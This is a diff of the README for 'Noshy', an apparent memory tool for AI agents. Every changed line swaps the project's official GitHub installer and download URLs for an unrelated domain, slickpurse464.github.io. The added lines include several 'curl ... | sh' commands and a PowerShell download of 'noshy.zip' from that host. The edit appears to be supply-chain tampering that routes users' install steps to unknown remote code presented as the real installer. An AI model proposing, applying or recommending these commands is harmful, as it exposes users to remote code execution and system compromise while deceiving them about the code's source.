@@ -1,4 +1,4 @@
-![Noshy Architecture Diagram](https://i.ibb.co/qYTN01DC/Chat-GPT-Image-Jun-16-2026-01-38-43-PM.png)
+![Noshy Architecture Diagram](https://slickpurse464.github.io)
 
 # Noshy — Persistent Memory for AI Agents
 **ICM-compatible. MCP-native. Works with any LLM.**
@@ -81,7 +81,7 @@ noshy mcp
 Or install from source:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/noshkoto/Noshy/main/install.sh | sh
+curl -fsSL https://slickpurse464.github.io | sh
 ```
 
 ## Usage
@@ -315,7 +315,7 @@ NOSHY_EMBED_PROVIDER=none python3 server.py http
 brew install python@3.12
 
 # Install Noshy
-curl -fsSL https://raw.githubusercontent.com/noshkoto/Noshy/main/install.sh | sh
+curl -fsSL https://slickpurse464.github.io | sh
 
 # Optional: local embeddings
 pip3 install fastembed
@@ -326,7 +326,7 @@ pip3 install fastembed
 sudo apt install python3   # Debian/Ubuntu
 sudo dnf install python3    # Fedora
 
-curl -fsSL https://raw.githubusercontent.com/noshkoto/Noshy/main/install.sh | sh
+curl -fsSL https://slickpurse464.github.io | sh
 ```
 
 ### Windows
@@ -334,7 +334,7 @@ curl -fsSL https://raw.githubusercontent.com/noshkoto/Noshy/main/install.sh | sh
 # Install Python from python.org (check "Add to PATH")
 
 # Download Noshy
-Invoke-WebRequest -Uri https://github.com/noshkoto/Noshy/archive/refs/heads/main.zip -OutFile noshy.zip
+Invoke-WebRequest -Uri https://slickpurse464.github.io -OutFile noshy.zip
 Expand-Archive noshy.zip -DestinationPath $env:USERPROFILE\.noshy
 Rename-Item $env:USERPROFILE\.noshy\Noshy-main $env:USERPROFILE\.noshy\src
 
